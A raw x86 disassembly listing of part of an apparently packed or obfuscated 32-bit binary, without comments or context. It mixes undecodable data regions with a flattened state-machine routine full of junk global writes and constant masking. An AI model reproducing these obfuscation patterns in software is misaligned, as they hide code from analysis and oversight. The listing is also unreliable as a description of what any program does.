  4091ec:	sbb    edi,DWORD PTR [esi*8-0x7633154e]
  4091f3:	xchg   edi,eax
  4091f4:	jns    0x40925a
  4091f6:	pop    esi
  4091f7:	and    ecx,esi
  4091f9:	pop    eax
  4091fa:	mov    eax,0x98dcaf87
  4091ff:	iret   
  409200:	(bad)  ds:[eax-0x5f2edab9]
  409207:	dec    esp
  409208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409209:	mov    ds:0x28fea00f,eax
  40920e:	rcl    edx,1
  409210:	test   al,0x99
  409212:	or     ebx,edi
  409214:	cmp    DWORD PTR [ebx],ecx
  409216:	mov    dl,0x97
  409218:	jecxz  0x409235
  40921a:	sti    
  40921b:	shr    DWORD PTR [eax-0x3d],0x8f
  40921f:	fs inc ebp
  409221:	inc    esi
  409222:	mov    ds:0xcee6f921,eax
  409227:	lea    ebp,[edi-0x415ce8bd]
  40922d:	dec    ebp
  40922e:	(bad)  
  409230:	(bad)  
  409231:	xor    ch,BYTE PTR [edi+0x4f401a89]
  409237:	push   ebp
  409238:	xor    ah,BYTE PTR ds:0x4b151fb4
  40923e:	jge    0x4092ac
  409240:	mov    eax,0xbd4f4dd9
  409245:	nop
  409246:	xchg   ecx,eax
  409247:	mov    al,0xb4
  409249:	jb     0x409218
  40924b:	push   ebp
  40924c:	inc    esi
  40924d:	mov    edi,0xebc27494
  409252:	pop    ebp
  409253:	mov    esi,0xafc77eb6
  409258:	and    al,0x75
  40925a:	lock jmp 0x64c3:0xb10bc115
  409262:	in     eax,0xc9
  409264:	mov    BYTE PTR ds:0x49fbf2bc,0xbc
  40926b:	int3   
  40926c:	sbb    dl,BYTE PTR [ecx-0x7c]
  40926f:	std    
  409270:	fs jl  0x409216
  409273:	xor    eax,0x91798a1
  409278:	aaa    
  409279:	mov    edx,0xe659c979
  40927e:	ins    DWORD PTR es:[edi],dx
  40927f:	xor    al,0x4d
  409281:	jno    0x4092f8
  409283:	mov    ecx,0x1cff1614
  409288:	and    BYTE PTR [ecx-0x39],dl
  40928b:	mov    bl,0xce
  40928d:	jmp    0x409261
  40928f:	bound  edi,QWORD PTR [eax-0x3c]
  409292:	push   ebp
  409293:	jp     0x4092b5
  409295:	xchg   esp,eax
  409296:	(bad)  
  409297:	test   al,0x9e
  409299:	lahf   
  40929a:	shr    BYTE PTR [ecx+0x1b2e4888],cl
  4092a0:	fdiv   DWORD PTR [ecx-0x40]
  4092a3:	xchg   ebx,eax
  4092a4:	(bad)  
  4092a5:	repz out dx,eax
  4092a7:	idiv   DWORD PTR [ebp-0x12825dd7]
  4092ad:	push   edx
  4092ae:	pop    esi
  4092af:	icebp  
  4092b0:	retf   0x74d3
  4092b3:	ds sti 
  4092b5:	mov    al,0x4e
  4092b7:	add    BYTE PTR [ecx+eax*4-0x75],al
  4092bb:	sub    al,cl
  4092bd:	mov    dl,dl
  4092bf:	and    bl,BYTE PTR [ebp+0x31]
  4092c2:	fwait
  4092c3:	mov    esp,0x163bf2c9
  4092c8:	mov    DWORD PTR [ecx+0x26],esp
  4092cb:	or     cl,BYTE PTR ds:0x8b3a2eb2
  4092d1:	in     al,dx
  4092d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092d3:	repz adc al,0x72
  4092d6:	mov    BYTE PTR [esi],bl
  4092d8:	aam    0xd4
  4092da:	fcom   DWORD PTR [ecx]
  4092dc:	dec    eax
  4092dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092de:	fiadd  WORD PTR [ecx+0x44]
  4092e1:	pop    eax
  4092e2:	fiadd  DWORD PTR [esi+0x5d]
  4092e5:	mov    al,0x96
  4092e7:	out    0xc2,eax
  4092e9:	mov    bh,0xf4
  4092eb:	adc    al,0xea
  4092ed:	int    0xc3
  4092ef:	imul   esi,DWORD PTR [ebp+ebx*1+0x7bc752a5],0xffffffee
  4092f7:	or     al,0xcd
  4092f9:	stos   BYTE PTR es:[edi],al
  4092fa:	pop    esp
  4092fb:	jge    0x409324
  4092fd:	push   ecx
  4092fe:	mov    esp,0x6786ec2c
  409303:	call   0x1366:0x541fb1bd
  40930a:	scas   eax,DWORD PTR es:[edi]
  40930b:	inc    esp
  40930c:	hlt    
  40930d:	hlt    
  40930e:	jmp    FWORD PTR [ebp-0x2d]
  409311:	enter  0xd92d,0x3a
  409315:	dec    eax
  409316:	adc    BYTE PTR [ebx-0xc],0xc6
  40931a:	sub    BYTE PTR [edx+esi*8+0x54],bl
  40931e:	sub    ch,al
  409320:	mov    es,WORD PTR [ebp+0x21]
  409323:	sub    BYTE PTR [edx+0x54],al
  409326:	mov    ah,0xdc
  409328:	daa    
  409329:	rcl    DWORD PTR [eax],1
  40932b:	xchg   esp,eax
  40932c:	push   ebx
  40932d:	cmp    DWORD PTR [edx+edx*2],0xffffffc6
  409331:	imul   edi,ebx,0xafd36dfc
  409337:	mov    edi,0xe5363bec
  40933c:	cmc    
  40933d:	sbb    ebp,DWORD PTR [edi-0x7e]
  409340:	dec    esp
  409341:	mov    eax,DWORD PTR [ebp-0x14]
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x4335e3
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	les    ebx,FWORD PTR [esi-0x61b9c828]
  4093a1:	in     eax,dx
  4093a2:	jl     0x409420
  4093a4:	adc    eax,0x567c7c7f
  4093a9:	sbb    al,0x50
  4093ab:	add    eax,0xf3e3a372
  4093b0:	push   0x31
  4093b2:	cmc    
  4093b3:	pop    edi
  4093b4:	mov    WORD PTR [edx+0x406fc2cb],?
  4093ba:	fisubr WORD PTR [edx-0x19]
  4093bd:	ins    BYTE PTR es:[edi],dx
  4093be:	fstp   DWORD PTR [ebx-0x7d]
  4093c1:	lock paddq mm2,QWORD PTR [ebx+0x60]
  4093c6:	cmp    DWORD PTR [edx],edx
  4093c8:	adc    edi,DWORD PTR [esi]
  4093ca:	scas   eax,DWORD PTR es:[edi]
  4093cb:	mov    al,ds:0xd87bb61d
  4093d0:	fsubr  QWORD PTR [edx]
  4093d2:	out    dx,al
  4093d3:	fadd   st(1),st
  4093d5:	sub    bh,bl
  4093d7:	rdtsc  
  4093d9:	jmp    0x4a475840
  4093de:	test   edx,0x873d98c5
  4093e4:	dec    ecx
  4093e5:	adc    al,0xb3
  4093e7:	xchg   ebp,eax
  4093e8:	lahf   
  4093e9:	or     ecx,DWORD PTR [edi+ebx*8-0x76]
  4093ed:	jmp    0xff982b6
  4093f2:	call   0xd0af:0x6de64e3e
  4093f9:	jns    0x40946a
  4093fb:	sub    DWORD PTR [edx-0x4db7bf8d],esi
  409401:	in     eax,dx
  409402:	in     eax,dx
  409403:	stos   DWORD PTR es:[edi],eax
  409404:	sbb    BYTE PTR [ebx],ch
  409406:	in     eax,0x4
  409408:	inc    ebp
  409409:	xchg   ebx,eax
  40940a:	and    eax,0xae7900c0
  40940f:	ss ds mov eax,0xf26b4fd
  409416:	inc    ecx
  409417:	sbb    DWORD PTR [ebx],ebp
  409419:	dec    ecx
  40941a:	jl     0x409417
  40941c:	sahf   
  40941d:	aad    0x10
  40941f:	push   esp
  409420:	retf   0x98ae
  409423:	jns    0x4094a3
  409425:	dec    edi
  409426:	mov    BYTE PTR [edi+0x4],dh
  409429:	xor    BYTE PTR ds:0xeb335e64,bh
  40942f:	ret    
  409430:	idiv   bh
  409432:	ror    esp,0x69
  409435:	cmp    bh,ch
  409437:	nop
  409438:	lock aas 
  40943a:	mov    ecx,0xe28d5601
  40943f:	ds pop es
  409441:	imul   edi,DWORD PTR [eiz*8-0x7d20dde4],0x146d3940
  40944c:	mov    eax,ds:0x4ab410f6
  409451:	js     0x4093fd
  409453:	cld    
  409454:	push   ebp
  409455:	mov    al,0x82
  409457:	add    BYTE PTR [esi+eiz*1+0x5],ch
  40945b:	mov    eax,DWORD PTR [ecx+ecx*1+0x4cdc3ad7]
  409462:	push   0xf1334bf2
  409467:	mov    dh,0xcd
  409469:	in     al,dx
  40946a:	mov    ah,0xbb
  40946c:	dec    ebp
  40946d:	mov    cl,0x86
  40946f:	ret    0x265c
  409472:	retf   
  409473:	sbb    al,0xfd
  409475:	mov    ds:0xf103285e,al
  40947a:	sub    cl,cl
  40947c:	xor    DWORD PTR [eax-0x37135be4],ebp
  409482:	cmc    
  409483:	push   0x62
  409485:	js     0x409446
  409487:	sbb    esi,DWORD PTR [esi-0x6ff2701f]
  40948d:	sub    eax,0xebee14c9
  409492:	adc    al,0x2d
  409494:	cmp    eax,0x1bb0fb81
  409499:	fstp   DWORD PTR [ebp-0x1e136024]
  40949f:	pop    eax
  4094a0:	mov    esp,DWORD PTR [ebp+0xba4c0d]
  4094a6:	xchg   ebp,eax
  4094a7:	pop    ds
  4094a8:	pop    esi
  4094a9:	outs   dx,DWORD PTR ds:[esi]
  4094aa:	sbb    BYTE PTR [ecx-0x63],bh
  4094ad:	mov    ds:0xb090e6ea,al
  4094b2:	call   0x655:0x241a01b9
  4094b9:	mov    al,ds:0x2866cdf
  4094be:	das    
  4094bf:	mov    eax,DWORD PTR [ebp+0x8]
  4094c2:	or     DWORD PTR ds:0x4335e7,0xc38
  4094cc:	push   ebx
  4094cd:	adc    DWORD PTR ds:0x433557,0x6147
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x433667,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x43355f,0x433557
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x43365f,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x4335ab,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x43355b,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x4335af,0x43366b
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x4335af,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x433567,0x43362f
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433597,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x4335ef,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x43366b,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x433563,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x43362f,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x43354b,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	sub    BYTE PTR [edx],dl
  4095c3:	or     BYTE PTR [edx-0x49],0xec
  4095c7:	jl     0x409645
  4095c9:	adc    eax,0xf07c7c7f
  4095ce:	or     BYTE PTR [ecx+edx*1-0x55],dh
  4095d2:	push   esi
  4095d3:	clc    
  4095d4:	in     al,0xa2
  4095d6:	loop   0x409596
  4095d8:	jns    0x40962a
  4095da:	int    0x59
  4095dc:	sbb    eax,0xadc0ff96
  4095e1:	ret    
  4095e2:	ret    
  4095e3:	ds ja  0x409572
  4095e6:	call   DWORD PTR [edx+0x70]
  4095e9:	mov    ch,BYTE PTR [ebp+0x1]
  4095ec:	sub    DWORD PTR [eax-0x6],esi
  4095ef:	psubusb mm7,mm6
  4095f2:	xlat   BYTE PTR ds:[ebx]
  4095f3:	in     eax,0xf1
  4095f5:	jg     0x40957b
  4095f7:	pop    es
  4095f8:	cmp    BYTE PTR [ecx+ecx*2],dl
  4095fb:	(bad)  
  4095fc:	sub    DWORD PTR [esi],eax
  4095fe:	xor    edx,DWORD PTR [ecx-0x20]
  409601:	xlat   BYTE PTR ds:[ebx]
  409602:	sub    eax,0x242345d6
  409607:	cmp    al,0xe8
  409609:	repz (bad) 
  40960b:	and    ch,BYTE PTR [ebx+ebp*1+0x66c6caed]
  409612:	dec    ecx
  409613:	test   DWORD PTR [edx+edi*4-0x2a],edx
  409617:	sbb    eax,0x73cf1ff2
  40961c:	(bad)  
  40961d:	cld    
  40961e:	push   edi
  40961f:	test   DWORD PTR gs:[ecx+0x74],eax
  409623:	rcr    BYTE PTR [ebx],cl
  409625:	int    0x1
  409627:	jmp    0xf5b3:0xc3d9551d
  40962e:	adc    al,0xfc
  409630:	jnp    0x40967b
  409632:	sub    DWORD PTR [edi+0x6d],esi
  409635:	xor    esp,esp
  409637:	and    BYTE PTR [ebp+0x6b905ef0],cl
  40963d:	pushf  
  40963e:	mov    edi,0x2ddadff8
  409643:	mov    dl,0x88
  409645:	xchg   esi,eax
  409646:	dec    eax
  409647:	arpl   bp,bp
  409649:	sub    BYTE PTR [ecx+0x79627be],bh
  40964f:	popa   
  409650:	mov    dl,0xe
  409652:	mov    eax,ds:0x6d62f1fe
  409657:	inc    ebx
  409658:	icebp  
  409659:	rcr    BYTE PTR [ebx+0x9760282],cl
  40965f:	loope  0x40966f
  409661:	and    bl,ah
  409663:	mov    ah,0xce
  409665:	dec    esi
  409666:	int3   
  409667:	add    al,bh
  409669:	jge    0x4095f4
  40966b:	daa    
  40966c:	xchg   ecx,eax
  40966d:	icebp  
  40966e:	cld    
  40966f:	xlat   BYTE PTR ds:[ebx]
  409670:	and    edi,ebp
  409672:	cmp    DWORD PTR [esi],ebx
  409674:	adc    al,0x3c
  409676:	pop    ebx
  409677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409678:	clc    
  409679:	or     edx,DWORD PTR [eax+0x458e9280]
  40967f:	data16 jne 0x4096fd
  409682:	pop    esp
  409683:	jmp    esi
  409685:	dec    esi
  409686:	sub    eax,0xf249b43b
  40968b:	(bad)  
  40968d:	sbb    BYTE PTR [esi+0x355a49fb],cl
  409693:	sbb    BYTE PTR [esi],0x2f
  409696:	push   esi
  409697:	dec    esi
  409698:	or     al,0xab
  40969a:	push   ecx
  40969b:	xchg   edx,eax
  40969c:	loope  0x4096b9
  40969e:	cs jmp 0x77c5c977
  4096a4:	pop    ecx
  4096a5:	adc    dl,ah
  4096a7:	sbb    BYTE PTR [ecx-0x5c08fa0b],cl
  4096ad:	sub    BYTE PTR [ecx-0xd],bh
  4096b0:	test   eax,0xc8c49334
  4096b5:	mov    edi,0xb215d5d1
  4096ba:	gs std 
  4096bc:	ins    BYTE PTR es:[edi],dx
  4096bd:	sbb    DWORD PTR [ecx],eax
  4096bf:	aas    
  4096c0:	dec    esp
  4096c1:	or     eax,0x81037bf8
  4096c6:	xor    BYTE PTR [ecx],ah
  4096c8:	stos   DWORD PTR es:[edi],eax
  4096c9:	push   0x396ac674
  4096ce:	dec    edx
  4096cf:	or     al,BYTE PTR [eax]
  4096d1:	iret   
  4096d2:	adc    DWORD PTR [edi],ebp
  4096d4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4096d6:	and    al,BYTE PTR [eax-0x10]
  4096d9:	xchg   edi,eax
  4096da:	pushf  
  4096db:	pushf  
  4096dc:	or     BYTE PTR [edx+0x37],bl
  4096df:	fst    QWORD PTR [ecx+edi*8-0x7e37f8]
  4096e6:	cmp    eax,0xc7000003
  4096eb:	add    eax,0x4335d7
  4096f0:	xchg   edi,eax
  4096f1:	add    DWORD PTR [eax],eax
  4096f3:	add    BYTE PTR [edi],cl
  4096f5:	test   DWORD PTR [eax+eax*1+0x0],ebp
  4096f9:	add    BYTE PTR [ebx-0x74fff79b],al
  4096ff:	inc    ebp
  409700:	clc    
  409701:	or     DWORD PTR ds:0x433623,0x4335e3
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x433663
  409714:	or     DWORD PTR ds:0x433623,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x43353f,0x4335af
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x433627,0x4335a7
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x43354b
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433617,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x43355f,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x4335ef,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x433667,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x43353f
  40978d:	and    DWORD PTR ds:0x4335af,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x43362f,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43359f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x4335e7
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x433627,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x43355f,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x4335eb,0x433633
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43361b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x43355f
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x4335b3,0x4335af
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	mov    WORD PTR [eax-0x80],es
  409829:	aam    0x4c
  40982b:	out    dx,eax
  40982c:	jl     0x4098aa
  40982e:	adc    eax,0xa57c7c7f
  409833:	sub    bl,BYTE PTR [ecx+0x54]
  409836:	lea    ebp,[edx]
  409838:	mov    ecx,0x81912f33
  40983d:	mov    ss,ecx
  40983f:	pop    edi
  409840:	or     dh,BYTE PTR [edi]
  409842:	in     eax,dx
  409843:	nop
  409844:	in     eax,0xa
  409846:	out    0xc0,al
  409848:	daa    
  409849:	dec    ebx
  40984a:	in     eax,dx
  40984b:	retf   0x4e79
  40984e:	pop    edx
  40984f:	cmp    ah,BYTE PTR [edi]
  409851:	daa    
  409852:	fmul   QWORD PTR [eax-0x62]
  409855:	pop    ebx
  409856:	dec    eax
  409857:	inc    edi
  409858:	inc    edx
  409859:	mov    WORD PTR [ebp+0x18a74ea5],ss
  40985f:	shr    BYTE PTR [edx],0x37
  409862:	push   ebp
  409863:	adc    al,0x5a
  409865:	xlat   BYTE PTR ds:[ebx]
  409866:	arpl   WORD PTR [ecx-0x5c],dx
  409869:	sbb    eax,0xa81ed62a
  40986e:	shl    BYTE PTR [edi+0x74],1
  409871:	xor    esi,esp
  409873:	je     0x4098e6
  409875:	pop    ebx
  409876:	mov    bh,0x36
  409878:	and    al,bh
  40987a:	or     al,0xaa
  40987c:	int3   
  40987d:	or     al,BYTE PTR [edx+ecx*1+0x434d5af8]
  409884:	rcl    DWORD PTR [esi],cl
  409886:	cmp    bh,BYTE PTR [edx+0x20]
  409889:	retfw  
  40988b:	pop    esp
  40988c:	sbb    eax,0x2ffbaba0
  409891:	mov    eax,ds:0x8127a8cd
  409896:	sub    al,0x8e
  409898:	sbb    al,0x4f
  40989a:	fs das 
  40989c:	lods   al,BYTE PTR ds:[esi]
  40989d:	xchg   DWORD PTR [edx+0x1313de67],edi
  4098a3:	out    0xdb,eax
  4098a5:	scas   eax,DWORD PTR es:[edi]
  4098a6:	mov    edi,0x6eb92abe
  4098ab:	in     eax,0x42
  4098ad:	test   eax,0x63900185
  4098b2:	hlt    
  4098b3:	shl    DWORD PTR [ecx+eiz*2],1
  4098b6:	repz jb 0x4098fa
  4098b9:	add    BYTE PTR [ecx+0x6b3d1892],ah
  4098bf:	imul   edi,eax,0x38
  4098c2:	or     BYTE PTR [edi-0x3],0x6b
  4098c6:	mov    DWORD PTR [ebx-0x9cc372f],esi
  4098cc:	(bad)  
  4098cd:	fcmovu st,st(3)
  4098cf:	mov    ds:0xb0190c76,eax
  4098d4:	jecxz  0x409892
  4098d6:	xchg   ecx,eax
  4098d7:	pop    eax
  4098d8:	dec    ebx
  4098d9:	fstp   TBYTE PTR [edi]
  4098db:	adc    ah,al
  4098dd:	into   
  4098de:	and    edi,DWORD PTR [edx+0x7dd745aa]
  4098e4:	mov    dh,0xa0
  4098e6:	fnstcw WORD PTR [edi]
  4098e8:	sar    DWORD PTR [ecx*4+0x66fedfbe],0x52
  4098f0:	jno    0x409938
  4098f2:	mov    ds:0x77f28900,eax
  4098f7:	cmp    al,0x28
  4098f9:	lahf   
  4098fa:	mov    bh,dh
  4098fc:	dec    eax
  4098fd:	or     dh,BYTE PTR [edx]
  4098ff:	dec    BYTE PTR [ebx]
  409901:	sub    DWORD PTR [esp+edx*8+0x31d6213e],ebp
  409908:	test   BYTE PTR [ebx],ah
  40990a:	aaa    
  40990b:	mov    esp,0xb5dc2b2e
  409910:	stc    
  409911:	add    eax,0x555e24a7
  409916:	pushf  
  409917:	xlat   BYTE PTR ds:[ebx]
  409918:	push   es
  409919:	dec    ebp
  40991a:	mov    ebp,0x8446e65b
  40991f:	fisubr DWORD PTR [esp-0x79c25eaf]
  409926:	call   0xbfbf:0x265e3a95
  40992d:	sbb    bl,BYTE PTR [edi+0xb7cdeb9]
  409933:	test   BYTE PTR [ecx*2-0x34a50712],0xd8
  40993b:	mov    BYTE PTR [esi+0x6a],dl
  40993e:	lock pop ss
  409940:	mov    ds:0xe8387f15,eax
  409945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409946:	pop    eax
  409947:	ds add eax,0xc303c633
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x433633
  4099ce:	sub    DWORD PTR ds:0x43353f,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x4335ef,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x43362f,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x4335b3,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x43354f,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x4335e3,0x1e
  409a19:	cmp    DWORD PTR ds:0x4335e3,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x4335e3,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43361b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x4335e3
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x4335e3,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x433673,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x4335db,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x433553
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x43353f,0x11
  409a8a:	cmp    DWORD PTR ds:0x43353f,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x43353f,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x43353f,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x43353f
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x43353f,edi
  409ad0:	mov    edi,DWORD PTR ds:0x43353f
  409ad6:	dec    edi
  409ad7:	mov    DWORD PTR ds:0x43353f,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x43362b,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x4335a3,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x4335a3
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x4335a3,edi
  409b0b:	cmp    DWORD PTR ds:0x4335a3,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x4335a3,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x4335a3,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x4335a3
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x4335a3,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433617,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433597
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x43362f
  409b70:	or     edi,DWORD PTR ds:0x43359f
  409b76:	mov    DWORD PTR ds:0x43362f,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x4335a3,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x433673
  409b98:	and    edx,DWORD PTR ds:0x433557
  409b9e:	mov    DWORD PTR ds:0x433673,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x4335af,0x15
  409bb5:	cmp    DWORD PTR ds:0x4335af,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x4335af,0x2
  409bc9:	jne    0x409bde
